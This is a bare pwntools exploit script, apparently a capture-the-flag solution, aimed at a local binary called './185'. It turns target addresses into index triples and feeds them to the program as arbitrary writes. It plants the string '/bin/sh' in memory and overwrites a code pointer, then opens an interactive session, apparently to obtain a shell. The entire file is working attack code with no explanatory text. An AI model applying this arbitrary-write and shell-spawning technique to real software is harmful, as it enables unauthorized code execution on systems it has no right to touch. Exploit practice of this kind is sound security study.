from pwn import *

context.log_level='debug'

c = process("./185")
#pause()

www = [(0x4e96c0, 0x6e69622f), (0x4e96c4, 0x68732f), (0x4e8b08, 0x4282f7)]

ww = []
for addr, val in www:
    off = (addr-0x437800)//4
    x = off//400+1
    y = off%400+1
    assert y>1
    ww.append((x,y,val))
m = len(www)
c.sendline('0 {}'.format(0x4d3c00))
for i in range(m):
    c.sendline("{} {} {}".format(*ww[i]))


c.interactive()
